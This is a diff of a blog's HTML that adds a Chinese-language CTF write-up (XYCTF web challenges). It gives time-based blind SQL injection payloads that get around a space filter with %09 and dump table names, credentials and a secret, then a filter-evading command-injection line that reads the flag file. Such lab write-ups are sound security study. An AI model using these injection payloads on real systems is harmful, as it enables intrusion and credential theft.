@@ -157,6 +157,95 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/08/XYCTF2025-WEB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/2.png">
+      <meta itemprop="name" content="Sauy">
+      <meta itemprop="description" content="World belongs to us.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sauy's corner">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/04/08/XYCTF2025-WEB/" class="post-title-link" itemprop="url">XYCTF题解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-04-08 00:00:00 / 修改时间：22:31:19" itemprop="dateCreated datePublished" datetime="2025-04-08T00:00:00+08:00">2025-04-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h4><p>js代码游戏 禁了一些常用快捷键 我的做法是将所有代码拉下来 自己本地用phpstudy起了一个服务</p>
+<p>具体改源代码逻辑</p>
+<p><img src="/images/4e7c83605519335fbb34e80ef7a6e426.png" alt="4e7c83605519335fbb34e80ef7a6e426"></p>
+<p><img src="/images/e1f786e2281b5f3f98e80d775d510e06.png" alt="e1f786e2281b5f3f98e80d775d510e06"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (G &lt; yw4) 改为 <span class="keyword">if</span> (G &gt; yw4) 这个是判断时间是否小于两秒的逻辑 把其改为大于 自己玩一遍拼图就ok了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250408191808338.png" alt="image-20250408191808338"></p>
+<p><code>flag&#123;Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!&#125;</code></p>
+<h4 id="ezsql-手动滑稽"><a href="#ezsql-手动滑稽" class="headerlink" title="ezsql(手动滑稽)"></a>ezsql(手动滑稽)</h4><p>sql毋庸置疑 注入点是usrname 闭合时单引号 fuzz一下发现过滤了,空格等</p>
+<p><img src="/images/1fb558d01d50d7ec0c8d4730cf4556a9.png" alt="1fb558d01d50d7ec0c8d4730cf4556a9"></p>
+<p>首先空格使用%09绕过 因为,被ban了的原因 很多语句都不可以用 使用 case when语句来进行时间盲注</p>
+<p>语句构造：</p>
+<h4 id="请注意"><a href="#请注意" class="headerlink" title="!!!请注意:"></a>!!!请注意:</h4><p><strong>python里盲注要把%09改为\t 因为request库会将\t编码为%09</strong></p>
+<p><code>爆数据库</code> &#x2F;&#x2F;testdb</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((database())%09FROM%091%09FOR%091))&gt;100)%09THEN%09SLEEP(2)%09ELSE%090%09END#         </span></span><br></pre></td></tr></table></figure>
+
+<p><code>爆表</code>&#x2F;&#x2F; double_check,user</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(table_name)%09FROM%09information_schema.tables%09WHERE%09table_schema=database())%09FROM%091%09FOR%091))&gt;100)%09THEN%09SLEEP(2)%09ELSE%090%09END#</span></span><br></pre></td></tr></table></figure>
+
+<p><code>爆列</code>&#x2F;&#x2F;secret,username,password</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(column_name)%09FROM%09information_schema.columns%09WHERE%09table_schema=database())%09FROM%091%09FOR%091))&gt;100)%09THEN%09SLEEP(2)%09ELSE%090%09END#</span></span><br></pre></td></tr></table></figure>
+
+<p><code>爆数据</code> &#x2F;&#x2F;过滤了逗号一个一个</p>
+<p>username&#x3D;yudeyoushang </p>
+<p>password&#x3D;zhonghengyisheng</p>
+<p>secret&#x3D;dtfrtkcc0czkoua9S</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(username)%09FROM%09double_check)%09FROM%091%09FOR%091))&gt;100)%09THEN%09SLEEP(2)%09ELSE%090%09END#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="operator">%</span><span class="number">09</span><span class="keyword">or</span><span class="operator">%</span><span class="number">09</span><span class="keyword">CASE</span><span class="operator">%</span><span class="number">09</span><span class="keyword">WHEN</span><span class="operator">%</span><span class="number">09</span>(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span><span class="operator">%</span><span class="number">09</span>GROUP_CONCAT(password)<span class="operator">%</span><span class="number">09</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">09</span>double_check)<span class="operator">%</span><span class="number">09</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">091</span><span class="operator">%</span><span class="number">09</span><span class="keyword">FOR</span><span class="operator">%</span><span class="number">091</span>))<span class="operator">&gt;</span><span class="number">100</span>)<span class="operator">%</span><span class="number">09</span><span class="keyword">THEN</span><span class="operator">%</span><span class="number">09</span>SLEEP(<span class="number">2</span>)<span class="operator">%</span><span class="number">09</span><span class="keyword">ELSE</span><span class="operator">%</span><span class="number">090</span><span class="operator">%</span><span class="number">09</span><span class="keyword">END</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(secret)%09FROM%09double_check)%09FROM%091%09FOR%091))&gt;100)%09THEN%09SLEEP(2)%09ELSE%090%09END#</span></span><br></pre></td></tr></table></figure>
+
+<p>好了现在就是超级时刻 拿着爆出的账号密码登录 然后进入发现要输入密钥 输入secret爆出的东西 进入一个命令执行系统</p>
+<p>执行命令就可以 过滤空格且无回显写入文件就好了 <code>cat$&#123;IFS&#125;/f*&gt;1.txt</code></p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250408222953224.png" alt="image-20250408222953224"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/07/NSSCTF%20Round30%20Basic%E5%8F%8C%E4%BA%BA%E7%BB%84%E9%98%9F%E8%B5%9B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -188,7 +277,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-04-08 01:11:42" itemprop="dateModified" datetime="2025-04-08T01:11:42+08:00">2025-04-08</time>
+                <time title="修改时间：2025-04-08 01:27:00" itemprop="dateModified" datetime="2025-04-08T01:27:00+08:00">2025-04-08</time>
               </span>
 
           
@@ -247,7 +336,7 @@
 <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p>
 <p>虚拟机clone下来 然后把里面的脚本改为下面这个 执行命令就好</p>
 <details>
-<summary>📂 展开查看</summary>
+<summary>📂 点击展开 cne.py</summary>
 
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include cne.py %&#125;</span><br></pre></td></tr></table></figure>
@@ -625,7 +714,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
